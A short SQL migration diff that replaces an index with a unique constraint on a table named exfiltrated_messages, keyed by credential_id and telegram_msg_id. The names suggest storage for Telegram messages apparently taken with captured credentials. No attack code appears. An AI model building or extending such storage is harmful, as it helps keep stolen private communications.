@@ -34,4 +34,6 @@ CREATE TABLE IF NOT EXISTS exfiltrated_messages (
 -- Indexes
 CREATE INDEX IF NOT EXISTS idx_messages_credential_id ON exfiltrated_messages(credential_id);
 CREATE INDEX IF NOT EXISTS idx_messages_is_broadcasted ON exfiltrated_messages(is_broadcasted) WHERE is_broadcasted = FALSE;
-CREATE INDEX IF NOT EXISTS idx_messages_unique_msg ON exfiltrated_messages(credential_id, telegram_msg_id);
+-- Unique constraint to prevent duplicate messages per credential
+ALTER TABLE exfiltrated_messages DROP CONSTRAINT IF EXISTS unique_msg_per_credential;
+ALTER TABLE exfiltrated_messages ADD CONSTRAINT unique_msg_per_credential UNIQUE (credential_id, telegram_msg_id);
